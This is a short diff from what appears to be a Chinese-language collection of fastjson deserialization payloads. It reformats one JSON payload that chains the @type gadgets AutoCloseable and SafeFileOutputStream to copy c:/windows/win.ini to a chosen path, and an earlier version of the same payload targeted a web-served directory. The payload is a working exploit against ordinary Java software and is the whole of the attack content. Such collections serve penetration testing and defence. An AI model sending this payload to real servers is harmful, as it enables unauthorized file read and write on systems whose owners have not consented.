@@ -672,7 +672,12 @@ https://b1ue.cn/archives/348.html   **使用Throwable子类造成信息泄露**
 ```
 
 ```json
-{"@type":"java.lang.AutoCloseable", "@type":"org.eclipse.core.internal.localstore.SafeFileOutputStream", "tempPath":"C:/Windows/win.ini", "targetPath":"D:/wamp64/www/win.txt"}
+{
+    "@type":"java.lang.AutoCloseable",
+    "@type":"org.eclipse.core.internal.localstore.SafeFileOutputStream",
+    "targetPath":"d:/1.txt",
+    "tempPath":"c:/windows/win.ini"
+}
 ```
 
 
